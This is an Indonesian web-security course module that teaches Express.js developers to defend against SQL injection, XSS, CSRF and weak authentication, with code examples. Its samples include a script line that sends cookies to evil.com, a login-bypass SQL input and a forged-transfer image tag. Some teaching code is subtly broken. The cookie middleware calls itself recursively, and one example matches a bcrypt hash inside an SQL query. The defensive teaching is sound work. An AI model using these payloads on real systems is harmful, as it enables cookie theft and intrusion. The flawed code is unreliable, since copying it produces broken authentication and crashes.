<img src="https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=800&h=300&dpr=1" alt="Cybersecurity" style="width:100%;border-radius:12px;margin:12px 0;">

# Modul 14: Cybersecurity untuk Web Developer

> **Level:** 🟡 Intermediate
> **Jam:** 8 (4 sesi × 2 jam)
> **Prasyarat:** Express.js, Prisma, JWT basics
> **Output:** Secure Express API dengan proteksi OWASP Top 10

## Tujuan Pembelajaran

Setelah modul ini, kamu bisa:
- Paham dan cegah OWASP Top 10 vulnerability
- Prevent SQL Injection & NoSQL Injection pake parameterized query
- Implement XSS protection (sanitasi, CSP headers)
- Pasang CSRF protection & SameSite cookies
- Hash password pake bcrypt + JWT secure practices
- Konfigurasi CORS, HTTPS, rate limiting, helmet
- Setup dependency scanning & secrets management
- Bikin CI/CD security pipeline sederhana

## Materi

| Sesi | Topik | File |
|------|-------|------|
| 1 | OWASP Top 10 & Injection Attacks | [01-owasp-injection.md](01-owasp-injection.md) |
| 2 | XSS & CSRF | [02-xss-csrf.md](02-xss-csrf.md) |
| 3 | Secure Auth, CORS & HTTPS | [03-auth-cors-https.md](03-auth-cors-https.md) |
| 4 | DevSecOps — Dependency & CI/CD Security | [04-devsecops.md](04-devsecops.md) |

## Output Akhir Modul

> **Secure Express API** — REST API lengkap dengan:
> - [ ] SQL Injection protection (parameterized query/ORM)
> - [ ] XSS sanitasi input & output + CSP header
> - [ ] CSRF token + SameSite cookie
> - [ ] bcrypt hashing + JWT (expiry, httpOnly)
> - [ ] CORS whitelist origin
> - [ ] HTTPS redirect + rate limiting
> - [ ] Helmet security headers
> - [ ] npm audit + Snyk scan di CI
> - [ ] .env + .gitignore aman

## AI Prompt Exercises

Sepanjang modul, latihan pake AI:
- "Audit this Express endpoint for OWASP Top 10 vulnerabilities"
- "Explain why this SQL query is vulnerable and fix it"
- "Generate a security checklist for my Express API"
- "Write a CSP policy for a blog that embeds YouTube videos"
- "Find the security bugs in this auth middleware"
- "Create a Snyk GitHub Action workflow for npm audit"

---

## Daftar Isi

1. [Kenapa Lo Peduli?](#1-kenapa-lo-peduli)
2. [OWASP Top 10 — Ancaman Paling Ganas](#2-owasp-top-10--ancaman-paling-ganas)
   - [SQL Injection](#sql-injection)
   - [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
   - [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
3. [Secure Authentication](#3-secure-authentication)
   - [JWT Best Practices](#jwt-best-practices)
   - [Bcrypt — Hash Password](#bcrypt--hash-password)
   - [Rate Limiting](#rate-limiting)
4. [Environment Security](#4-environment-security)
5. [HTTPS & SSL Dasar](#5-https--ssl-dasar)
6. [Common Attacks di Website Indonesia](#6-common-attacks-di-website-indonesia)
7. [Praktik: Express Middleware Keamanan](#7-praktik-express-middleware-keamanan)
8. [Kesimpulan](#8-kesimpulan)

---

## 1. Kenapa Lo Peduli?

Tahun 2024 Indonesia masuk 5 besar negara asal serangan siber di Asia Tenggara (Laporan BSSN 2024). Rata-rata **16.000+ serangan per hari** nargetin web app lokal. Startup, e-commerce, sekolah — semua kena.

Banyak bocor karena **developer nggak ngurus keamanan**:
- Password disimpan plain text
- API endpoint nggak divalidasi
- .env ikut commit ke GitHub

Modul ini ngajarin **cara bertahan**. Bukan teori doang — lo bakal liat kode yang bisa lo pake sekarang.

---

## 2. OWASP Top 10 — Ancaman Paling Ganas

**OWASP (Open Web Application Security Project)** tiap 4 tahun ngeluarin 10 kerentanan web paling kritis. Yang paling sering nimpain aplikasi buatan SMK RPL:

### SQL Injection

**Cara kerja:** Attacker nyisipin query SQL lewat input form atau URL parameter. Kalo aplikasi lo nggak sanitasi input, query jadi:

```sql
-- Kode lo:
SELECT * FROM users WHERE email = '$email' AND password = '$pass'

-- Attacker masukin: admin' --
-- Jadinya:
SELECT * FROM users WHERE email = 'admin' -- ' AND password = '...'
```

**Semua baris keambil.** Login tanpa password.

**Pencegahan — WAJIB: Prepared Statement / Parameterized Query**

```js
// ❌ RENTAN — jangan pernah!
const query = `SELECT * FROM users WHERE email = '${email}'`;

// ✅ AMAN — pake parameterized query (contoh pake mysql2)
const [rows] = await db.query('SELECT * FROM users WHERE email = ? AND password = ?', [email, hash]);
```

Atau kalo pake Prisma / ORM lain — **udah aman secara default** karena ORM otomatis pake parameterized query.

### XSS (Cross-Site Scripting)

**Cara kerja:** Attacker nyuntikin script jahat lewat input (komentar, profil, search bar). Script jalan di browser korban — nyolong cookie, redirect ke phishing site, atau ubah tampilan.

**Tipe XSS:**
- **Stored XSS:** Script disimpan di database (paling bahaya)
- **Reflected XSS:** Script ada di URL
- **DOM-based XSS:** Script dimanipulasi lewat JavaScript client-side

**Contoh serangan:**
```html
<!-- Attacker masukin komentar: -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

**Pencegahan:**

```js
// ✅ AMAN — sanitasi input sebelum render
// Pake library seperti DOMPurify (client) atau express-validator (server)

const { body, validationResult } = require('express-validator');
app.post('/komentar',
  body('isi').escape(), // otomatis encode HTML
  (req, res) => { ... }
);
```

Di **EJS/Handlebars**: pake `<%= %>` (escape otomatis), jangan `<%- %>` (raw).

**Header penting:**
```js
// Middleware: set Content-Security-Policy
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted-cdn.com"
  );
  next();
});
```

### CSRF (Cross-Site Request Forgery)

**Cara kerja:** Attacker nipu user yang udah login buat ngeklik link jahat. Karena browser nyimpen cookie, request palsu keliatan sah.

**Contoh:** User login di bank.com. Attacker kirim link `<img src="http://bank.com/transfer?amount=1000000&to=attacker">`. Browser user otomatis kirim cookie.

**Pencegahan — CSRF Token:**

```js
// Pake csurf atau csrf-csrf
const csrf = require('csrf-csrf');
const { doubleCsrf } = csrf;
const { generateToken, validateRequest } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET,
});

app.use(validateRequest);
```

Atau yang lebih modern: **SameSite Cookie** (set cookie attribute `SameSite=Strict` / `SameSite=Lax`).

```js
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // blokir CSRF dari domain lain
});
```

---

## 3. Secure Authentication

### JWT Best Practices

JSON Web Token (JWT) sering dipake di API Express. Tapi banyak yang salah pake.

```js
const jwt = require('jsonwebtoken');

// ✅ AMAN
const token = jwt.sign(
  { userId: user.id },
  process.env.JWT_SECRET,       // simpan di .env, bukan hardcode
  { expiresIn: '1h' }           // expire — jangan unlimited!
);

// ❌ RENTAN — jangan pernah!
const token = jwt.sign({ role: 'admin' }, 'rahasia123', { noTimestamp: true });
```

**Checklist JWT:**
1. **Secret minimal 256-bit** — generate pake: `require('crypto').randomBytes(32).toString('hex')`
2. **Set expiry singkat** — 15 menit access token, refresh token lebih panjang (7 hari)
3. **Jangan simpan di localStorage** — pake httpOnly cookie
4. **Verifikasi di setiap endpoint protected**

```js
// Middleware verifikasi JWT
function authMiddleware(req, res, next) {
  const token = req.cookies.token || req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Token invalid/expired' });
  }
}
```

### Bcrypt — Hash Password

**Jangan pernah simpan password plain text.** Pake bcrypt — library hash yang punya **salt otomatis** dan **cost factor** biar slow (susah di-brute-force).

```js
const bcrypt = require('bcrypt');
const saltRounds = 12; // recommended: 10-12

// Hash pas register
const hash = await bcrypt.hash(password, saltRounds);
await db.query('INSERT INTO users (email, password) VALUES (?, ?)', [email, hash]);

// Verify pas login
const match = await bcrypt.compare(inputPassword, user.password);
if (!match) return res.status(401).json({ error: 'Password salah' });
```

**Kenapa bcrypt?** Argon2 lebih kuat, tapi bcrypt paling didukung di Node.js ecosystem. Pilih salah satu, asal bukan MD5/SHA1 — itu bisa dibalikin dalam detik pake tabel rainbow.

### Rate Limiting

Batasin jumlah request per IP biar nggak kena **brute force** atau **DDoS** basic.

```js
const rateLimit = require('express-rate-limit');

// Di login: 5 percobaan per 15 menit
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Terlalu banyak percobaan. Coba lagi 15 menit lagi.' },
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/api/login', loginLimiter);

// Di API umum: 100 request per menit
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100,
});

app.use('/api', apiLimiter);
```

---

## 4. Environment Security

### .env File

Semua rahasia di `.env` — jangan hardcode di source code.

```
# .env — contoh
DB_HOST=localhost
DB_USER=root
DB_PASS=s3cr3t!
JWT_SECRET=5f8a2b1c9d3e7f4a6b0c2d8e1f4a6b0c
CSRF_SECRET=9f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c
PORT=3000
NODE_ENV=production
```

### .gitignore

**Ini yang paling sering dilanggar.** Banyak developer commit `.env` ke GitHub — langsung kena hack.

```
# .gitignore — harus ada di root project
.env
.env.local
node_modules/
*.log
.DS_Store
dist/
```

**Peringatan keras:** Kalo lo commit `.env` ke repo publik, ganti semua secret dalam 5 menit. Bot udah otomatis scan GitHub buat nyari file `.env`.

### Alternatif Aman

Kalo pake hosting kayak Railway / Vercel / Render — pake **environment variables** dari dashboard, jangan pake file `.env` di production.

---

## 5. HTTPS & SSL Dasar

**HTTP = data dikirim dalam teks jelas.** Siapa pun di jaringan yang sama (WiFi kafe, sekolah) bisa baca request lo — termasuk password dan token.

**HTTPS = data dienkripsi pake TLS.** Lo butuh **SSL Certificate**.

### Cara dapetin SSL gratis

Pake **Let's Encrypt** lewat Certbot:

```bash
# Di server Linux
sudo apt install certbot python3-certbot-nginx
sudo certbot --nginx -d domainkamu.com
```

Otomatis renew tiap 90 hari. Tinggal jalanin `cron`.

### Redirect HTTP ke HTTPS di Express

```js
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https' && process.env.NODE_ENV === 'production') {
    return res.redirect(`https://${req.hostname}${req.url}`);
  }
  next();
});
```

Atau lebih gampang — pake **NGINX reverse proxy** di depan Express. NGINX handle SSL, Express jalan di localhost.

---

## 6. Common Attacks di Website Indonesia

Berdasarkan data BSSN dan laporan keamanan publik:

| Serangan | Real Case Indonesia | Efek |
|----------|-------------------|------|
| **SQL Injection** | 2023 — 50+ situs Pemda kena SQLi, data warga bocor (peristiwa Etza Meow) | Data KTP, KK, akun publik |
| **Defacement** | 2024 — Ratusan situs .go.id kena deface, diganti logo hacker | Reputasi rusak, ditutup sementara |
| **Credential Stuffing** | Bocoran database e-commerce dipake login ulang ke platform lain | Akun user diretas |
| **CORS Misconfiguration** | Web app pake `Access-Control-Allow-Origin: *` | Data bisa dicuri via script pihak ketiga |
| **Missing Rate Limit** | Endpoint OTP di fintech lokal bisa di-brute | Akun bisa diambil alih |

### Pencegahan Spesifik untuk Web Indonesia

1. **Jangan pernah percaya input user** — validasi di server, bukan cuma di frontend
2. **Gunakan HTTPS** — gratis kok, pake Let's Encrypt
3. **Jangan expose port database (3306/5432) ke publik** — cukup localhost doang
4. **Logging + monitoring** — pake `morgan` buat log, `winston` buat simpan error
5. **Update dependency rutin** — `npm audit fix` minimal seminggu sekali

### CORS — Konfigurasi yang Benar

```js
const cors = require('cors');

// ❌ RENTAN — jangan pernah!
app.use(cors({ origin: '*' }));

// ✅ AMAN — specify origin yang spesifik
app.use(cors({
  origin: 'https://frontend-kamu.com',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
}));
```

---

## 7. Praktik: Express Middleware Keamanan

Gabungin semua yang udah dibahas jadi satu middleware keamanan:

```js
// middleware/security.js
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const cors = require('cors');

module.exports = (app) => {
  // 1. Helmet — set berbagai HTTP header keamanan
  //    (X-Content-Type-Options, X-Frame-Options, dkk)
  app.use(helmet());

  // 2. CORS — cuma domain lo yang bisa akses API
  app.use(cors({
    origin: process.env.FRONTEND_URL || 'http://localhost:3000',
    credentials: true,
  }));

  // 3. Rate limiting global
  app.use(rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
  }));

  // 4. Prevent parameter pollution
  //    (hacker kirim ?id=1&id=2&id=3 buat bypass)
  const hpp = require('hpp');
  app.use(hpp());

  // 5. Cookie security
  app.use((req, res, next) => {
    res.cookie = (name, value, options) => {
      const secureOpts = {
        httpOnly: true,     // nggak bisa diakses JS
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        ...options,
      };
      return res.cookie(name, value, secureOpts);
    };
    next();
  });
};
```

### Auth Middleware Lengkap

```js
// middleware/auth.js
const jwt = require('jsonwebtoken');

function authenticate(req, res, next) {
  const token = req.cookies.token || req.headers.authorization?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'Akses ditolak. Login dulu.' });
  }

  try {
    const verified = jwt.verify(token, process.env.JWT_SECRET);
    req.user = verified;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Sesi habis. Login ulang.' });
    }
    return res.status(400).json({ error: 'Token nggak valid.' });
  }
}

function adminOnly(req, res, next) {
  if (!req.user || req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Hanya admin yang bisa akses.' });
  }
  next();
}

module.exports = { authenticate, adminOnly };
```

### Input Validation Middleware

```js
const { body, validationResult } = require('express-validator');

const validateRegister = [
  body('email').isEmail().normalizeEmail(),
  body('password')
    .isLength({ min: 8 })
    .withMessage('Password minimal 8 karakter'),
  body('nama').trim().escape(),
  (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    next();
  }
];

app.post('/api/register', validateRegister, async (req, res) => {
  // kode registration — input udah divalidasi & aman
});
```

---

## 8. Kesimpulan

**Cybersecurity bukan opsional — itu bagian dari development.** Lo nggak perlu jadi hacker buat bikin app yang aman. Cukup disiplin pake praktek dasar ini:

| Praktik | Level Prioritas |
|---------|----------------|
| Prepared statement / ORM | 🔴 WAJIB |
| Password hashing (bcrypt) | 🔴 WAJIB |
| .env + .gitignore | 🔴 WAJIB |
| HTTPS | 🟡 WAJIB buat production |
| Rate limiting | 🟡 Sangat disarankan |
| CORS konfigurasi | 🟡 Sangat disarankan |
| Helmet header | 🟡 Sangat disarankan |
| CSRF protection | 🟢 Kalo pake cookie auth |
| CSP header | 🟢 Tambahan proteksi |

**Checklist sebelum deploy:**
1. [ ] .env nggak ke-commit? Cek: `git status`
2. [ ] Semua input pake parameterized query atau ORM?
3. [ ] Password di-hash pake bcrypt?
4. [ ] HTTPS udah aktif?
5. [ ] Rate limiter udah dipasang di endpoint login?
6. [ ] CORS cuma buka domain yang dikenal?
7. [ ] Dependency di-audit? Jalanin `npm audit`

> **Peringatan terakhir:** Satu celah kecil bisa bobolain seluruh aplikasi. Jangan nunggu kena hack baru belajar.

---

*Referensi: OWASP.org, BSSN Laporan Tahunan 2024, Node.js Security Best Practices*
